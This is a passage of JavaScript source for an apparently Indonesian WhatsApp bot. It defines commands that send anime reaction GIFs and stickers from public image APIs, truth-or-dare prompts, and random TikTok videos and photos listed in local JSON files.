axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
hanz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packName, author: global.authorName },{ quoted: m })
})
}
break
// =========== FITUR FUN ======≠=====//
 case 'truth':
		const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
    const ttrth = trut[Math.floor(Math.random() * trut.length)]
    let Trut = Ehztext(ttrth)
		sendButDoc(Trut,'Lanjut','truth')
		break
   case 'dare':
		const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
  let DaRe = Ehztext(der)
		sendButDoc(DaRe,'Lanjut','dare')
		break
case 'jjmeryani':{
setReply(mess.wait)
let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
//hanz.sendMessage(m.chat,{video:{url:hayu},caption:`nih kak🗿`},{quoted: m})
sendButVid('Berhasil',hayu,'Next..','jjmeryani')
}
break 
case 'tiktokghea':
    setReply(mess.wait);
    const filePath8 = path.resolve('./json/tiktokvids/gheayubi.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath8); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var gheayubi = JSON.parse(fs.readFileSync(filePath8, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(gheayubi);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'tiktokghea'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'cosplayangel':
    setReply(mess.wait);
    const filePath7 = path.resolve('./json/tiktokvids/cosplayangel.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath7); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var gheayubi = JSON.parse(fs.readFileSync(filePath7, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(gheayubi);
        
        // Mengirim pesan dengan video
        hanz.sendMessage(m.chat, { 
            caption: 'Nih bang Ehanz\nIngat jangan Gamon yak\nAng3l udah pergi ;)', 
            video: { url: hasil.url } 
        }, { quoted: m });
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'tiktokbocil':
    setReply(mess.wait);
    const filePath6 = path.resolve('./json/tiktokvids/bocil.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath6); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var bocil = JSON.parse(fs.readFileSync(filePath6, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(bocil);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'tiktokbocil'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'videosad':
    setReply(mess.wait);
     const filePath5 = path.resolve('./json/tiktokvids/videosad.json');
        // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath5); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var sadnYa = JSON.parse(fs.readFileSync(filePath5, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(sadnYa);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'videosad'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'videowibu':
    setReply(mess.wait);
    const filePath4 = path.resolve('./json/tiktokvids/wibuvid.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath4); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var santuy = JSON.parse(fs.readFileSync(filePath4, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(santuy);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'videowibu'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'tiktokkayes':
    setReply(mess.wait);
    const filePath = path.resolve('./json/tiktokvids/kayes.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var kayes = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(kayes);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'tiktokkayes'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.');
    }
    break;

case 'tiktokpanrika':
    setReply(mess.wait);
    const filePath2 = path.resolve('./json/tiktokvids/panrika.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath2); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var rikagusriani = JSON.parse(fs.readFileSync(filePath2, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(rikagusriani);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'tiktokpanrika'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'videogalau':
    setReply(mess.wait);
    const filePath3 = path.resolve( './json/tiktokvids/galau.json'); // Sesuaikan jalur jika perlu
    console.log('Mencoba untuk membaca dari:', filePath3); // Debugging
    try {
        // Membaca file dan mengurai JSON
        var notnot = JSON.parse(fs.readFileSync(filePath3, 'utf-8'));
        
        // Memilih URL secara acak
        var hasil = pickRandom(notnot);
        
        // Mengirim video
        sendButVid('Berhasil', hasil.url, 'Next..', 'videogalau'); // Menggunakan hasil.url
    } catch (error) {
        console.error('Error saat membaca file:', error); // Menampilkan error
        setReply('Terjadi kesalahan saat mencoba membaca file.'); // Memberi tahu pengguna
    }
    break;
case 'chinese':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','chinese')
//hanz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','hijab')
break
case 'indo':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','indo')
break
case 'japanese':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','japanese')
break
case 'korean':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','korean')
break
case 'malay':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','malay')
break
case 'randomgirl':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','randomgirl')
break
case 'randomboy':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','randomboy')
break
case 'thai':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','thai')
break
case 'vietnamese':
setReply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./json/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
sendButImg('succes',hasil.url,'Next','vietnamese')
break       
case 'hug': {
        if (!m.isGroup) return onlyToko()
      await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)
    try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var ment = [messsender, users]
          } catch {
            users == "none"
       ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} hugged themself!`
          } else {
         musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
  case 'cry': {
    if (!m.isGroup) return onlyToko()
    await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} cried themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'kill': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
         let   users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} killed themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'pat': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} patted themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'lick': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} licked themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
 hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'kiss': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} kissed themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'bite': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)
        try {
  let messsender = m.sender
   let musers = ``
    try {
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} bit themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
         hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'yeet': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} yeeted themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'bully': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} bullied themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'bonk': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} bonked themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
 hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }      }
        break;
        case 'wink': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
  var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)
       try {
         let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} winked themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
          hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'poke': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} poked themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
 hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'nom': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} nommed themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'slap': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} slapped themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
 hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })        } catch (error) {    
      console.log(error);
   }
      }
        break;
        case 'smile': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} smiled themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
    break;
   case 'wave': {
     if (!m.isGroup) return onlyToko()
     await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
           let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
           var ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} waved themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
 hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
        case 'awoo': {
          if (!m.isGroup) return onlyToko()
          await loading()
        if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)
        try {
          let messsender = m.sender
          let musers = ``
          try {
          let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          var  ment = [messsender, users]
          } catch {
            users == "none"
            ment = [messsender, m.sender]
          }
          if (users == "none") {
           musers = `@${m.sender.split("@")[0]} awooed themself!`
          } else {
           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `
          }
          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
          const buffer = Buffer.from(response.data, "utf-8")
          var fetchedgif = await GIFBufferToVideoBuffer(buffer)
  hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
        } catch (error) {
          console.log(error);
        }
      }
        break;
            case 'blush': {
              if (!m.isGroup) return onlyToko()
              await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
